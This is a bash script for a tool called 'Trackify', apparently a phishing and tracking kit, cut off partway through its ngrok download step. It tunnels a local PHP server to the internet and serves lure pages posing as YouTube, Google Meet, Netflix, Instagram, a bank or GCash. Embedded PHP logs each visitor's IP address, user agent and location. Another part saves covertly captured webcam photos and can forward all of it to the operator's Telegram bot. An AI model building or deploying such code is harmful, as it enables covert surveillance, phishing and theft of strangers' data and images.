#!/bin/bash
# Trackify v1.0 — Hack-style terminal UI

# ANSI: hack palette — use real ESC so terminals don't show literal \e[...]
ESC=$'\033'
C="${ESC}[0;36m"
G="${ESC}[0;32m"
Gb="${ESC}[1;32m"
Y="${ESC}[0;33m"
R="${ESC}[0;31m"
Rb="${ESC}[1;31m"
W="${ESC}[0;37m"
Dim="${ESC}[0;90m"
Reset="${ESC}[0m"

trap 'printf "\n";stop' 2

banner() {
clear
printf "${C}"
printf "  ╔══════════════════════════════════════════════════════════════╗\n"
printf "  ║  ${G}████████╗██████╗  █████╗  ██████╗██╗  ██╗██╗███████╗██╗   ██╗${C}  ║\n"
printf "  ║  ${G}╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██║██╔════╝╚██╗ ██╔╝${C}  ║\n"
printf "  ║  ${G}   ██║   ██████╔╝███████║██║     █████╔╝ ██║█████╗   ╚████╔╝ ${C}  ║\n"
printf "  ║  ${G}   ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██║██╔══╝    ╚██╔╝  ${C}  ║\n"
printf "  ║  ${G}   ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║        ██║   ${C}  ║\n"
printf "  ║  ${G}   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   ${C}  ║\n"
printf "  ╠══════════════════════════════════════════════════════════════╣\n"
printf "  ║  ${Y}  [*] IP TRACKER // GEOLOCATION  │  root@trackify:~#${C}           ║\n"
printf "  ╚══════════════════════════════════════════════════════════════╝\n"
printf "${Reset}\n"
printf "  ${Dim}Developed by: 0Cod3${Reset}\n\n"
}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
checkcloudflared=$(ps aux | grep -o "cloudflared" | head -n1)

if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi

if [[ $checkcloudflared == *'cloudflared'* ]]; then
pkill -f -2 cloudflared > /dev/null 2>&1
killall -2 cloudflared > /dev/null 2>&1
fi

exit 1

}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "${C}[${G}+${C}] IP:${W} %s${Reset}\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "${G}[${C}*${G}] Waiting targets,${W} Press Ctrl + C to exit...${Reset}\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n${Gb}[${G}+${Gb}] Target opened the link!${Reset}\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "location_notify.txt" ]]; then
printf "\n${Gb}[${G}+${Gb}] New Target Opened the Link!${Reset}\n"
while IFS= read -r line; do
    printf "${C}%s${Reset}\n" "$line"
done < location_notify.txt
rm -f location_notify.txt
fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n${Gb}[${G}+${Gb}] Victim's Photo Received!${Reset}\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "${C}[${Y}+${C}] Starting Serveo...${Reset}\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
printf "${C}[${Y}+${C}] Starting php server... (localhost:3333)${Reset}\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3

# Wait for sendlink file to have content (with timeout)
printf "${C}[${Y}+${C}] Waiting for Serveo link...${Reset}\n"
max_wait=30
wait_count=0
while [ $wait_count -lt $max_wait ]; do
    if [[ -s "sendlink" ]]; then
        # Check if file contains a URL
        if grep -qE "https://" sendlink 2>/dev/null; then
            break
        fi
    fi
    sleep 1
    wait_count=$((wait_count + 1))
done

# Strip ANSI codes first, then extract URL - this handles the escape sequences
send_link=$(cat sendlink 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' | grep -oE "https://[^[:space:]]+" | head -n1)
# If that fails, try with a more specific pattern
if [[ -z "$send_link" ]]; then
    send_link=$(cat sendlink 2>/dev/null | tr -d '\r' | sed 's/\x1b\[[0-9;]*m//g' | grep -oE "https://[a-zA-Z0-9\-\.]+\.(serveo\.net|serveousercontent\.com)" | head -n1)
fi
# Last resort: extract anything after https://
if [[ -z "$send_link" ]]; then
    send_link=$(cat sendlink 2>/dev/null | sed 's/.*https:\/\///' | sed 's/[[:space:]].*//' | head -n1)
    if [[ -n "$send_link" && "$send_link" != *"https://"* ]]; then
        send_link="https://$send_link"
    fi
fi
# Display the link
if [[ -n "$send_link" ]]; then
    printf "\n${G}[${C}+${G}] Tracker Link:${W} %s${Reset}\n\n" "$send_link"
else
    printf "\n${Rb}[!] Could not extract link from sendlink file${Reset}\n"
    printf "${Dim}[DEBUG] sendlink file exists: %s${Reset}\n" "$([ -e sendlink ] && echo 'yes' || echo 'no')"
    printf "${Dim}[DEBUG] sendlink file size: %s bytes${Reset}\n" "$([ -e sendlink ] && wc -c < sendlink || echo '0')"
    printf "${Dim}[DEBUG] sendlink contents:${Reset}\n"
    cat sendlink 2>/dev/null || echo "Cannot read sendlink file"
    printf "${Dim}[DEBUG] Cleaned contents (without ANSI codes):${Reset}\n"
    cat sendlink 2>/dev/null | sed 's/\x1b\[[0-9;]*m//g' || echo "Cannot process sendlink file"
    printf '\n'
fi

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
if [[ -z "$link" ]]; then
    printf "${Rb}[!] Error: Could not extract Ngrok link${Reset}\n"
    return 1
fi
generate_payload "$link"

}

cloudflared_server() {

command -v cloudflared > /dev/null 2>&1
if [[ $? -ne 0 ]]; then
    printf "${G}[${G}+${G}] Cloudflared not found. Downloading...${Reset}\n"
    arch=$(uname -m)
    os=$(uname -s | tr '[:upper:]' '[:lower:]')
    
    if [[ "$os" == "linux" ]]; then
        if [[ "$arch" == *"arm"* ]] || [[ "$arch" == *"aarch64"* ]]; then
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared 2>/dev/null || \
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared 2>/dev/null
        elif [[ "$arch" == *"x86_64"* ]] || [[ "$arch" == *"amd64"* ]]; then
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared 2>/dev/null
        else
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared 2>/dev/null
        fi
    elif [[ "$os" == "darwin" ]]; then
        if [[ "$arch" == *"arm"* ]] || [[ "$arch" == *"aarch64"* ]]; then
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64 -O cloudflared 2>/dev/null
        else
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64 -O cloudflared 2>/dev/null
        fi
    else
        printf "${Y}[!] Unsupported OS. Please install cloudflared manually.${Reset}\n"
        printf "${Y}[!] Visit: https://github.com/cloudflare/cloudflared/releases${Reset}\n"
        exit 1
    fi
    
    if [[ -e cloudflared ]]; then
        chmod +x cloudflared
        printf "${G}[${C}*${G}] Cloudflared downloaded successfully${Reset}\n"
    else
        printf "${Y}[!] Download failed. Please install cloudflared manually.${Reset}\n"
        exit 1
    fi
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

printf "${C}[${Y}+${C}] Starting php server... (localhost:3333)${Reset}\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 2

printf "${C}[${Y}+${C}] Starting Cloudflare tunnel...${Reset}\n"
if [[ -e cloudflared ]]; then
    ./cloudflared tunnel --url http://localhost:3333 > sendlink 2>&1 &
else
    cloudflared tunnel --url http://localhost:3333 > sendlink 2>&1 &
fi

sleep 8

# Wait for sendlink file to have content (with timeout)
printf "${C}[${Y}+${C}] Waiting for Cloudflare tunnel link...${Reset}\n"
max_wait=30
wait_count=0
while [ $wait_count -lt $max_wait ]; do
    if [[ -s "sendlink" ]]; then
        # Check if file contains a URL
        if grep -qE "https://.*trycloudflare.com" sendlink 2>/dev/null; then
            break
        fi
    fi
    sleep 1
    wait_count=$((wait_count + 1))
done

# Extract Cloudflare tunnel URL
send_link=$(cat sendlink 2>/dev/null | grep -oE "https://[a-zA-Z0-9\-]+\.trycloudflare\.com" | head -n1)

if [[ -n "$send_link" ]]; then
    printf "\n${G}[${C}+${G}] Tracker Link:${W} %s${Reset}\n\n" "$send_link"
    # Generate payload with the extracted link
    generate_payload "$send_link"
else
    printf "\n${Rb}[!] Could not extract Cloudflare tunnel link${Reset}\n"
    printf "${Dim}[DEBUG] sendlink file exists: %s${Reset}\n" "$([ -e sendlink ] && echo 'yes' || echo 'no')"
    printf "${Dim}[DEBUG] sendlink contents:${Reset}\n"
    cat sendlink 2>/dev/null | head -20 || echo "Cannot read sendlink file"
    printf '\n'
    return 1
fi

}

generate_payload() {
local link="$1"
if [[ -z "$link" ]]; then
    printf "${Rb}[!] Error: No link provided for payload generation${Reset}\n"
    return 1
fi

# Generate index.php with forwarding link
sed 's+forwarding_link+'$link'+g' template.php > index.php

# Backup original PHP files if backup doesn't exist
if [[ ! -f "ip.php.backup" ]] && [[ -f "ip.php" ]]; then
    cp ip.php ip.php.backup 2>/dev/null || true
fi
if [[ ! -f "post.php.backup" ]] && [[ -f "post.php" ]]; then
    cp post.php post.php.backup 2>/dev/null || true
fi

# Always restore from backup first (if exists) to ensure clean state
if [[ -f "ip.php.backup" ]]; then
    cp ip.php.backup ip.php 2>/dev/null || true
fi
if [[ -f "post.php.backup" ]]; then
    cp post.php.backup post.php 2>/dev/null || true
fi

# Generate ip.php with Telegram configuration if enabled
if [[ "$telegram_enabled" == "1" ]]; then
    # Create ip.php with Telegram support (reads from config file)
    cat > ip.php << 'IPEOF'
<?php

// Include geolocation helper
if (file_exists('geo.php')) {
    require_once 'geo.php';
}

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];

// Get IP geolocation if geo.php is available
$ip_clean = trim($ipaddress);
$geo = null;
if (function_exists('getIPLocation')) {
    $geo = getIPLocation($ip_clean);
    if ($geo && function_exists('saveGeoData')) {
        saveGeoData($ip_clean, $geo);
    }
}

$file = 'ip.txt';
$victim = "IP: ";
$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser);

// Add geolocation info to file if available
if ($geo && function_exists('formatGeoLocation') && isset($geo['status']) && $geo['status'] === 'success') {
    fwrite($fp, "\n" . formatGeoLocation($geo) . "\n");
}

fclose($fp);

// Send to Telegram - load from config file
$telegram_token = '';
$telegram_chat = '';
$config_file = 'telegram_config.json';

if (file_exists($config_file)) {
    $config_content = file_get_contents($config_file);
    $config = json_decode($config_content, true);
    if ($config && isset($config['bot_token']) && isset($config['chat_id'])) {
        $telegram_token = $config['bot_token'];
        $telegram_chat = $config['chat_id'];
    }
}

// Only send if Telegram is configured
if (!empty($telegram_token) && !empty($telegram_chat)) {
    $browser_clean = htmlspecialchars($browser, ENT_QUOTES, 'UTF-8');
    $message = "🔔 *New Target Opened Link*\n\n";
    $message .= "📍 *IP Address:* " . $ip_clean . "\n";
    $message .= "🌐 *User Agent:* " . $browser_clean . "\n";
    $message .= "⏰ *Time:* " . date('Y-m-d H:i:s') . "\n";

    if ($geo && function_exists('formatGeoForTelegram') && isset($geo['status']) && $geo['status'] === 'success') {
        $message .= "\n" . formatGeoForTelegram($geo);
    }

    $url = "https://api.telegram.org/bot" . $telegram_token . "/sendMessage";
    $data = array(
        'chat_id' => $telegram_chat,
        'text' => $message,
        'parse_mode' => 'Markdown'
    );

    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 8);
        curl_setopt($ch, CURLOPT_TIMEOUT, 12);
        $result = @curl_exec($ch);
        $err = curl_error($ch);
        curl_close($ch);
        if ($err) {
            @error_log("Telegram cURL error: " . $err, 3, "telegram_error.log");
        }
    } else {
        $options = array(
            'http' => array(
                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => http_build_query($data),
                'timeout' => 12,
                'ignore_errors' => true
            )
        );
        $context = stream_context_create($options);
        $result = @file_get_contents($url, false, $context);
        if ($result === false && function_exists('error_get_last')) {
            $e = error_get_last();
            if ($e) {
                @error_log("Telegram send error: " . $e['message'], 3, "telegram_error.log");
            }
        }
    }
}
IPEOF
fi

# Generate post.php with Telegram configuration if enabled
if [[ "$telegram_enabled" == "1" ]]; then
    cat > post.php << 'POSTEOF'
<?php

$date = date('dMYHis');
$imageData=$_POST['cat'];

if (!empty($_POST['cat'])) {
error_log("Received" . "\r\n", 3, "Log.log");
}

// Create folder name with current date only
$folderName = date('Y-m-d');

// Create folder if it doesn't exist
if (!file_exists($folderName)) {
    mkdir($folderName, 0777, true);
}

$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$filePath = $folderName . '/cam' . $date . '.png';
$fp = fopen($filePath, 'wb');
fwrite($fp, $unencodedData);
fclose($fp);

// Send to Telegram - load from config file
$telegram_token = '';
$telegram_chat = '';
$config_file = 'telegram_config.json';

if (file_exists($config_file)) {
    $config_content = file_get_contents($config_file);
    $config = json_decode($config_content, true);
    if ($config && isset($config['bot_token']) && isset($config['chat_id'])) {
        $telegram_token = $config['bot_token'];
        $telegram_chat = $config['chat_id'];
    }
}

// Only send if Telegram is configured
if (!empty($telegram_token) && !empty($telegram_chat)) {
    // Send photo to Telegram using cURL if available, otherwise use file_get_contents
    $url = "https://api.telegram.org/bot" . $telegram_token . "/sendPhoto";
    $caption = "📸 *Camera Capture*\n\n⏰ *Time:* " . date('Y-m-d H:i:s');

    if (function_exists('curl_file_create')) {
        // Use cURL (preferred method)
        $cfile = curl_file_create($filePath, 'image/png', 'cam' . $date . '.png');
        $data = array(
            'chat_id' => $telegram_chat,
            'photo' => $cfile,
            'caption' => $caption,
            'parse_mode' => 'Markdown'
        );
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $result = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);
        
        if ($error) {
            error_log("Telegram cURL error: " . $error, 3, "telegram_error.log");
        }
    } else {
        // Fallback to file_get_contents with multipart
        $boundary = uniqid();
        $delimiter = '-------------' . $boundary;
        
        $postData = '';
        $postData .= "--" . $delimiter . "\r\n";
        $postData .= 'Content-Disposition: form-data; name="chat_id"' . "\r\n\r\n";
        $postData .= $telegram_chat . "\r\n";
        
        $postData .= "--" . $delimiter . "\r\n";
        $postData .= 'Content-Disposition: form-data; name="photo"; filename="cam' . $date . '.png"' . "\r\n";
        $postData .= 'Content-Type: image/png' . "\r\n\r\n";
        $postData .= $unencodedData . "\r\n";
        
        $postData .= "--" . $delimiter . "\r\n";
        $postData .= 'Content-Disposition: form-data; name="caption"' . "\r\n\r\n";
        $postData .= $caption . "\r\n";
        $postData .= "--" . $delimiter . "--\r\n";
        
        $options = array(
            'http' => array(
                'method' => 'POST',
                'header' => 'Content-Type: multipart/form-data; boundary=' . $delimiter,
                'content' => $postData,
                'timeout' => 10,
                'ignore_errors' => true
            )
        );
        
        $context = stream_context_create($options);
        $result = @file_get_contents($url, false, $context);
        
        if ($result === false) {
            $error = error_get_last();
            if ($error !== null) {
                error_log("Telegram send error: " . $error['message'], 3, "telegram_error.log");
            }
        }
    }
}

exit();
?>
POSTEOF
fi

if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' Youtube.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
rm -rf index3.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' Gmeet.html > index2.html
elif [[ $option_tem -eq 3 ]]; then
sed 's+forwarding_link+'$link'+g' Sensitive.html > index2.html
elif [[ $option_tem -eq 4 ]]; then
sed 's+forwarding_link+'$link'+g' Netflix.html > index2.html
elif [[ $option_tem -eq 5 ]]; then
sed 's+forwarding_link+'$link'+g' Instagram.html > index2.html
elif [[ $option_tem -eq 6 ]]; then
sed 's+forwarding_link+'$link'+g' Bank.html > index2.html
elif [[ $option_tem -eq 7 ]]; then
sed 's+forwarding_link+'$link'+g' GCash.html > index2.html
fi
}

read_telegram_config() {
local config_file="telegram_config.json"
telegram_token=""
telegram_chat=""

if [[ ! -f "$config_file" ]]; then
    return 1
fi

# Use PHP to parse JSON (most reliable since PHP is a dependency)
if command -v php > /dev/null 2>&1; then
    telegram_token=$(php -r "\$config = json_decode(file_get_contents('$config_file'), true); echo isset(\$config['bot_token']) ? \$config['bot_token'] : '';" 2>/dev/null | tr -d '\r\n')
    telegram_chat=$(php -r "\$config = json_decode(file_get_contents('$config_file'), true); echo isset(\$config['chat_id']) ? \$config['chat_id'] : '';" 2>/dev/null | tr -d '\r\n')
# Try Python as fallback
elif command -v python3 > /dev/null 2>&1; then
    telegram_token=$(python3 -c "import json; f=open('$config_file', 'r', encoding='utf-8'); d=json.load(f); f.close(); print(d.get('bot_token', '') or '')" 2>/dev/null | tr -d '\r\n')
    telegram_chat=$(python3 -c "import json; f=open('$config_file', 'r', encoding='utf-8'); d=json.load(f); f.close(); print(d.get('chat_id', '') or '')" 2>/dev/null | tr -d '\r\n')
elif command -v python > /dev/null 2>&1; then
    telegram_token=$(python -c "import json; f=open('$config_file', 'r'); d=json.load(f); f.close(); print(d.get('bot_token', '') or '')" 2>/dev/null | tr -d '\r\n')
    telegram_chat=$(python -c "import json; f=open('$config_file', 'r'); d=json.load(f); f.close(); print(d.get('chat_id', '') or '')" 2>/dev/null | tr -d '\r\n')
elif command -v jq > /dev/null 2>&1; then
    telegram_token=$(jq -r '.bot_token // empty' "$config_file" 2>/dev/null | tr -d '\r\n')
    telegram_chat=$(jq -r '.chat_id // empty' "$config_file" 2>/dev/null | tr -d '\r\n')
fi

# If still empty, use simple text parsing (works everywhere including Windows Git Bash)
if [[ -z "$telegram_token" ]] || [[ -z "$telegram_chat" ]]; then
    # Read entire file content
    local file_content=$(cat "$config_file" 2>/dev/null | tr -d '\r')
    
    # Extract bot_token - look for pattern: "bot_token": "value"
    if echo "$file_content" | grep -q '"bot_token"'; then
        # Try multiple extraction methods
        telegram_token=$(echo "$file_content" | grep -o '"bot_token"[^}]*' | grep -o '"[^"]*"' | head -2 | tail -1 | tr -d '"')
        # If that didn't work, try sed
        if [[ -z "$telegram_token" ]]; then
            telegram_token=$(echo "$file_content" | sed -n 's/.*"bot_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
        fi
    fi
    
    # Extract chat_id - look for pattern: "chat_id": "value"
    if echo "$file_content" | grep -q '"chat_id"'; then
        # Try multiple extraction methods
        telegram_chat=$(echo "$file_content" | grep -o '"chat_id"[^}]*' | grep -o '"[^"]*"' | head -2 | tail -1 | tr -d '"')
        # If that didn't work, try sed
        if [[ -z "$telegram_chat" ]]; then
            telegram_chat=$(echo "$file_content" | sed -n 's/.*"chat_id"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
        fi
    fi
fi

# Trim whitespace (handle both spaces and tabs)
telegram_token=$(echo "$telegram_token" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
telegram_chat=$(echo "$telegram_chat" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')

# Check if values are valid (not empty and not just whitespace)
if [[ -n "$telegram_token" && "$telegram_token" != "null" && -n "$telegram_chat" && "$telegram_chat" != "null" ]]; then
    return 0
fi

return 1
}

save_telegram_config() {
local config_file="telegram_config.json"
local token="$1"
local chat="$2"

# Try to save using available tools
if command -v python3 > /dev/null 2>&1; then
    python3 -c "import json; f=open('$config_file', 'w'); json.dump({'bot_token': '$token', 'chat_id': '$chat'}, f, indent=2); f.close()" 2>/dev/null
elif command -v python > /dev/null 2>&1; then
    python -c "import json; f=open('$config_file', 'w'); json.dump({'bot_token': '$token', 'chat_id': '$chat'}, f, indent=2); f.close()" 2>/dev/null
elif command -v jq > /dev/null 2>&1; then
    echo "{\"bot_token\": \"$token\", \"chat_id\": \"$chat\"}" | jq '.' > "$config_file" 2>/dev/null
else
    # Fallback: simple JSON writing
    cat > "$config_file" << EOF
{
  "bot_token": "$token",
  "chat_id": "$chat"
}
EOF
fi

if [[ -f "$config_file" ]]; then
    printf "${G}[${G}+${G}] Telegram configuration saved to %s${Reset}\n" "$config_file"
    return 0
else
    printf "${Y}[!] Warning: Could not save configuration file${Reset}\n"
    return 1
fi
}

normalize_telegram_chat() {
local chat="$1"
# If it's already a chat ID (numeric, can be negative), use as is
if [[ "$chat" =~ ^-?[0-9]+$ ]]; then
    echo "$chat"
# If it starts with @, use as is
elif [[ "$chat" =~ ^@ ]]; then
    echo "$chat"
# Otherwise, add @ prefix for username
else
    echo "@$chat"
fi
}

test_telegram_bot() {
local test_message="Trackify Telegram bot is configured correctly. This is a test message."
local url="https://api.telegram.org/bot${telegram_token}/sendMessage"

if command -v curl > /dev/null 2>&1; then
    response=$(curl -s -S --connect-timeout 10 --max-time 15 -X POST "$url" \
        --data-urlencode "chat_id=${telegram_chat}" \
        --data-urlencode "text=${test_message}" 2>&1)
elif command -v wget > /dev/null 2>&1; then
    response=$(wget -qO- --timeout=15 --post-data="chat_id=${telegram_chat}&text=$(printf '%s' "$test_message" | sed 's/ /%20/g')" "$url" 2>&1)
else
    printf "${Y}[!] curl or wget not found. Cannot test Telegram connection.${Reset}\n"
    printf "${Y}[!] Please make sure your bot token and chat ID are correct.${Reset}\n"
    return 1
fi

if echo "$response" | grep -q '"ok":true'; then
    printf "${G}[${G}+${G}] Telegram bot test successful! Check your Telegram for the test message.${Reset}\n"
    return 0
else
    printf "${Rb}[!] Telegram bot test failed!${Reset}\n"
    printf "${Y}[!] Response: %s${Reset}\n" "$response"
    printf "${Y}[!] Common issues:${Reset}\n"
    printf "${Y}    - Invalid bot token${Reset}\n"
    printf "${Y}    - Bot hasn't been started (send /start to your bot first)${Reset}\n"
    printf "${Y}    - Invalid username/chat ID${Reset}\n"
    printf "${Y}    - Username must start with @ or be a numeric chat ID${Reset}\n"
    read -p $'\n'"${G}[${C}+${G}] Continue anyway? [y/N]: ${Reset}" continue_anyway
    if [[ ! "$continue_anyway" =~ ^[Yy]$ ]]; then
        select_notification
    fi
    return 1
fi
}

select_notification() {
printf "\n${C}----- Choose notification method -----${Reset}\n"
printf "\n  ${G}[${W}01${G}]${Y} Default (Local file)${Reset}\n"
printf "  ${G}[${W}02${G}]${Y} Telegram Bot${Reset}\n"
default_option_notification="1"
read -p $'\n'"${G}[${C}+${G}] Choose notification method: [Default is 1] ${Reset}" option_notification
option_notification="${option_notification:-${default_option_notification}}"
if [[ $option_notification -eq 1 ]]; then
printf "${Y}[${C}*${Y}] Selected: Default (Local file)${Reset}\n"
telegram_enabled="0"
elif [[ $option_notification -eq 2 ]]; then
printf "${Y}[${C}*${Y}] Selected: Telegram Bot${Reset}\n"
telegram_enabled="1"

# Try to load from config file first
if read_telegram_config; then
    printf "${G}[${G}+${G}] Loaded Telegram configuration from telegram_config.json${Reset}\n"
    printf "${C}[${Y}+${C}] Bot Token: ${W}%s...${Reset}\n" "${telegram_token:0:20}"
    printf "${C}[${Y}+${C}] Chat ID: ${W}%s${Reset}\n" "$telegram_chat"
    printf "${C}[${Y}+${C}] Testing Telegram bot connection...${Reset}\n"
    test_telegram_bot
else
    # Config file doesn't exist or is invalid, prompt for details
    printf "${Y}[${C}*${Y}] No valid Telegram configuration found in telegram_config.json${Reset}\n"
    printf "${Y}[${C}*${Y}] Note: Get your bot token from @BotFather on Telegram${Reset}\n"
    read -p $'\n'"${G}[${C}+${G}] Enter Telegram Bot Token: ${Reset}" telegram_token
    printf "${Y}[${C}*${Y}] Note: Enter YOUR username (where bot will send data), NOT the bot username${Reset}\n"
    read -p $'\n'"${G}[${C}+${G}] Enter YOUR Telegram Username (e.g., yourusername) or Chat ID: ${Reset}" telegram_chat_input
    if [[ -z "$telegram_token" ]] || [[ -z "$telegram_chat_input" ]]; then
        printf "${Y} [!] Telegram token and username/chat_id are required!${Reset}\n"
        sleep 1
        select_notification
    else
        telegram_chat=$(normalize_telegram_chat "$telegram_chat_input")
        printf "${G}[${C}*${G}] Using chat identifier: ${W}%s${Reset}\n" "$telegram_chat"
        printf "${C}[${Y}+${C}] Testing Telegram bot connection...${Reset}\n"
        test_telegram_bot
        
        # Save configuration after successful test
        if [[ $? -eq 0 ]]; then
            save_telegram_config "$telegram_token" "$telegram_chat"
        fi
    fi
fi
else
printf "${Y} [!] Invalid notification option! try again${Reset}\n"
sleep 1
select_notification
fi
}

select_template() {
printf "\n${C}----- Choose a template -----${Reset}\n"
printf "\n  ${G}[${W}01${G}]${Y} YouTube Live${Reset}\n"
printf "  ${G}[${W}02${G}]${Y} Google Meet${Reset}\n"
printf "  ${G}[${W}03${G}]${Y} Sensitive Video (Age Verification)${Reset}\n"
printf "  ${G}[${W}04${G}]${Y} Netflix Login${Reset}\n"
printf "  ${G}[${W}05${G}]${Y} Instagram Verification${Reset}\n"
printf "  ${G}[${W}06${G}]${Y} Bank Login${Reset}\n"
printf "  ${G}[${W}07${G}]${Y} GCash Verification${Reset}\n"
default_option_template="1"
read -p $'\n'"${G}[${C}+${G}] Choose a template: [Default is 1] ${Reset}" option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'\n'"${G}[${C}+${G}] Enter YouTube video watch ID: ${Reset}" yt_video_ID
elif [[ $option_tem -eq 2 ]]; then
printf ""
elif [[ $option_tem -eq 3 ]]; then
printf ""
elif [[ $option_tem -eq 4 ]]; then
printf ""
elif [[ $option_tem -eq 5 ]]; then
printf ""
elif [[ $option_tem -eq 6 ]]; then
printf ""
elif [[ $option_tem -eq 7 ]]; then
printf ""
else
printf "${Y} [!] Invalid template option! try again${Reset}\n"
sleep 1
select_template
fi
}

select_tunnel() {
printf "\n${C}----- Choose a tunnel service -----${Reset}\n"
printf "\n  ${G}[${W}01${G}]${Y} Ngrok${Reset}\n"
printf "  ${G}[${W}02${G}]${Y} Cloudflare Tunnel (cloudflared)${Reset}\n"
printf "  ${G}[${W}03${G}]${Y} Serveo.net${Reset}\n"
default_option_tunnel="3"
read -p $'\n'"${G}[${C}+${G}] Choose a tunnel service: [Default is 3] ${Reset}" option_tunnel
option_tunnel="${option_tunnel:-${default_option_tunnel}}"
if [[ $option_tunnel -eq 1 ]]; then
printf "${Y}[${C}*${Y}] Selected: Ngrok${Reset}\n"
elif [[ $option_tunnel -eq 2 ]]; then
printf "${Y}[${C}*${Y}] Selected: Cloudflare Tunnel${Reset}\n"
elif [[ $option_tunnel -eq 3 ]]; then
printf "${Y}[${C}*${Y}] Selected: Serveo.net${Reset}\n"
else
printf "${Y} [!] Invalid tunnel option! try again${Reset}\n"
sleep 1
select_tunnel
fi
}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "${G}[${G}+${G}] Downloading Ngrok...${Reset}\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "${Y}[!] Download error... Termux, run: ${W}pkg install wget${Reset}\n"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
